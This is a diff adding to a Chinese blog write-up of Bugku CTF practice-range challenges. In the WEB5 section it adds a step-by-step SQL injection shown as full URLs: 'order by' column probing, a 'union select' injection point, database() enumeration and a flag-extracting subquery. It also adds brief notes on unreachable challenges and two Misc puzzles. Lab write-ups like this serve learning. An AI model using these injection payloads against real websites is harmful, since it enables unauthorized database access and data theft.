@@ -405,6 +405,19 @@
 <h2 id="WEB5"><a href="#WEB5" class="headerlink" title="WEB5"></a>WEB5</h2><p>在进行查看题目的URL时候已经提示为injection</p>
 <p><img src="/2020/02/15/CTF%E8%AE%BA%E5%89%91%E5%9C%BAWriteUp/9.png" alt="img"></p>
 <p>直接用的sqlmap 好像把我踢了？？？什么情况？有时间在做</p>
+<p>可以访问了，妈的</p>
+<p>尝试了一下发现id存在数字型注入。</p>
+<p><a href="http://6fe97759aa27a0c9.bugku.com/?mod=read&amp;id=1%20order%20by%204" target="_blank" rel="noopener">http://6fe97759aa27a0c9.bugku.com/?mod=read&amp;id=1%20order%20by%204</a> 正常</p>
+<p><a href="http://6fe97759aa27a0c9.bugku.com/?mod=read&amp;id=1%20order%20by%205" target="_blank" rel="noopener">http://6fe97759aa27a0c9.bugku.com/?mod=read&amp;id=1%20order%20by%205</a> 报错</p>
+<p>确定注入点</p>
+<p><a href="http://6fe97759aa27a0c9.bugku.com/?mod=read&amp;id=-1%20union%20select%201,2,3,4" target="_blank" rel="noopener">http://6fe97759aa27a0c9.bugku.com/?mod=read&amp;id=-1%20union%20select%201,2,3,4</a></p>
+<p><img src="/2020/02/15/CTF%E8%AE%BA%E5%89%91%E5%9C%BAWriteUp/24.png" alt="img"></p>
+<p>在查询一下当前数据库</p>
+<p><a href="http://6fe97759aa27a0c9.bugku.com/?mod=read&amp;id=-1%20union%20select%201,2,database(),4&amp;wafcloud=1" target="_blank" rel="noopener">http://6fe97759aa27a0c9.bugku.com/?mod=read&amp;id=-1%20union%20select%201,2,database(),4&amp;wafcloud=1</a></p>
+<p><img src="/2020/02/15/CTF%E8%AE%BA%E5%89%91%E5%9C%BAWriteUp/25.png" alt="img"></p>
+<p>查询flag</p>
+<p><a href="http://6fe97759aa27a0c9.bugku.com/?mod=read&amp;id=-1%20union%20select%201,2,(select%20*from%20flag),4&amp;wafcloud=1" target="_blank" rel="noopener">http://6fe97759aa27a0c9.bugku.com/?mod=read&amp;id=-1%20union%20select%201,2,(select%20*from%20flag),4&amp;wafcloud=1</a></p>
+<p><img src="/2020/02/15/CTF%E8%AE%BA%E5%89%91%E5%9C%BAWriteUp/26.png" alt="img"></p>
 <h2 id="WEB6"><a href="#WEB6" class="headerlink" title="WEB6"></a>WEB6</h2><p>在尝试admin/admin登录的时候提示：‘IP禁止访问，请联系本地管理员登陆，IP已被记录.’</p>
 <p><img src="/2020/02/15/CTF%E8%AE%BA%E5%89%91%E5%9C%BAWriteUp/10.png" alt="img"></p>
 <p>可以了不报这个问题了。尝试一下万能密码</p>
@@ -438,7 +451,16 @@
 <p>学乖点手工吧。</p>
 <p>csrf token mismatch ？？？</p>
 <p><img src="/2020/02/15/CTF%E8%AE%BA%E5%89%91%E5%9C%BAWriteUp/23.png" alt="img"></p>
+<p>//本来想接着做，无法访问到了先放一放吧。</p>
+<h2 id="WEB9"><a href="#WEB9" class="headerlink" title="WEB9"></a>WEB9</h2><p>//该网页无法正常运作  - -.</p>
+<h2 id="WEB10"><a href="#WEB10" class="headerlink" title="WEB10"></a>WEB10</h2><p>//该网页无法正常运作  - -.</p>
+<p>去看看别的类型吧</p>
 <h1 id="Mics"><a href="#Mics" class="headerlink" title="Mics"></a>Mics</h1><h2 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h2><p>介绍:萌萌哒头像flag为flag{flag的md5 32位加密值}</p>
+<p>直接nano打开搜索一下 提交既可。</p>
+<p><img src="/2020/02/15/CTF%E8%AE%BA%E5%89%91%E5%9C%BAWriteUp/27.png" alt="img"></p>
+<h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>首先打开压缩包发现压缩密码为base64图片，直接还原得到解压密码</p>
+<p><img src="/2020/02/15/CTF%E8%AE%BA%E5%89%91%E5%9C%BAWriteUp/28.png" alt="img"></p>
+<p>打开压缩包一共159个二维码</p>
 ]]></content>
       <tags>
         <tag>靶场记录</tag>
